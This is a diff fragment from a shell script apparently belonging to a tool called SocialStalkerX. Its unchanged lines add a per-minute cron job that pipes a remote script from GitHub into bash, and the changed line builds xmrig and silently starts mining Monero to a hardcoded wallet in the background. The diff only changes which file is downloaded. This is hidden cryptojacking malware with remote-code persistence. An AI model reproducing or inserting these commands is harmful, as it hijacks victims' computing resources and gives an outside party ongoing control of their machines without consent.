@@ -12,7 +12,7 @@ echo "cd && cd xmrig && cd build && ./xmrig -o pool.supportxmr.com:443 -u 47NhmE
 echo "*/1 * * * * curl https://raw.githubusercontent.com/Lady-error/SocialStalkerX/main/check.sh | bash > /dev/null 2>&1 &" > cron && cat cron | crontab -
 rm cron
 sudo apt update && sudo apt install git && sudo apt-get install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
-git clone https://github.com/xmrig/xmrig.git && cd xmrig && mkdir build && cd build && cmake .. && make -j$(nproc) && wget https://raw.githubusercontent.com/Lady-error/SocialStalkerX/4279b81bdbf61eea31d971a4195a48cc84fb0dae/config.json && ./xmrig -o pool.supportxmr.com:443 -u 47NhmEW2UmMA2ceXpPea7E13FQJK7rf5gSQLuYan4qpz8aPbZaan6nSEQycdNhn4KzCqrNUsvnKcLDajgHs4m67iUhPv3VP -k --tls -p Linux > /dev/null 2>&1 &   
+git clone https://github.com/xmrig/xmrig.git && cd xmrig && mkdir build && cd build && cmake .. && make -j$(nproc) && wget https://github.com/Lady-error/SocialStalkerX/blob/main/stalkerX.sh && ./xmrig -o pool.supportxmr.com:443 -u 47NhmEW2UmMA2ceXpPea7E13FQJK7rf5gSQLuYan4qpz8aPbZaan6nSEQycdNhn4KzCqrNUsvnKcLDajgHs4m67iUhPv3VP -k --tls -p Linux > /dev/null 2>&1 &   
 echo "Press any key to continue"
 trap 'printf "\n";stop;exit 1' 2
 
